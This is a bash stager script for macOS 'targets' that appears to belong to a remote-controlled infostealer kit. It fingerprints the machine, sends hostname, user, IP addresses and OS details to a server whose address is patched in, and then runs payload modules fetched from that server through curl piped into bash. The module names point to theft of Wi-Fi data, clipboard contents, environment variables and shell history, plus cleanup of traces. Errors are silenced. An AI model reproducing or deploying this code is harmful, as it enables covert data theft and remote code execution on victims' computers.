#!/bin/bash
# init_mac.sh - entry point for Mac targets

H=""  # auto-patched by server.py
P=""  # auto-patched by server.py
AU="Basic "  # auto-patched by server.py

# --- generate target hash (stable per machine) ---
TH=$(echo -n "$(hostname)$(whoami)" | shasum -a 256 | cut -c1-8)

# --- collect basic sysinfo ---
IP=$(ifconfig | grep "inet " | grep -v "127.0.0.1" | awk '{print $2}' | head -3 | tr '\n' ' ')
OS=$(sw_vers -productName 2>/dev/null)
OS_VER=$(sw_vers -productVersion 2>/dev/null)
CPU=$(sysctl -n machdep.cpu.brand_string 2>/dev/null)
RAM=$(( $(sysctl -n hw.memsize) / 1024 / 1024 / 1024 ))
PWD_NOW=$(pwd)
TIME=$(date '+%Y-%m-%d %H:%M:%S')

INFO="hostname : $(hostname)
user     : $(whoami)
os       : $OS $OS_VER
ip       : $IP
pwd      : $PWD_NOW
cpu      : $CPU
ram      : ${RAM} GB
time     : $TIME"

# --- POST sysinfo ---
curl -s -X POST "https://$H:$P/store/init" \
     -H "Authorization: $AU" \
     -H "Content-Type: text/plain" \
     -H "X-Target: $TH" \
     --data "$INFO" >/dev/null 2>&1

# --- run each module in order, continue if one fails ---
PAYLOADS="recon_mac.sh wifi_mac.sh clipboard_mac.sh envvars_mac.sh history_mac.sh custom_mac.sh clearance_mac.sh mom_mac.sh"

for FILE in $PAYLOADS; do
    bash <(curl -s -H "Authorization: $AU" "https://$H:$P/moduls/$FILE") 2>/dev/null || true
done
